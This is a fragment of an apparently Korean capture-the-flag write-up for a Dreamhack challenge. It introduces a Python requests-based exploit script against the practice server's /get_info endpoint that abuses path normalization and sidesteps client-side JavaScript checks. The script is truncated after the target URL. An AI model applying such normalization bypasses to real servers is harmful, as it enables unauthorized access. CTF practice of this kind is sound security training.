...
### 3.2. 최종 Exploit 스크립트 (`exploit.py`)
앞선 시행착오를 통해 **브라우저의 JavaScript 변조 함정을 완전히 우회**하고, **운영 서버의 경로 정규화(Normalization) 기능을 활용**하기 위해 파이썬 `requests` 모듈을 이용한 직접 공격을 수행함.

```python
import requests

# 실전 드림핵 원격 서버 주소
url = "http://host8.dreamhack.games:20505/get_info"
...
![Exploit 실행 결과](./images/04-flag.png)
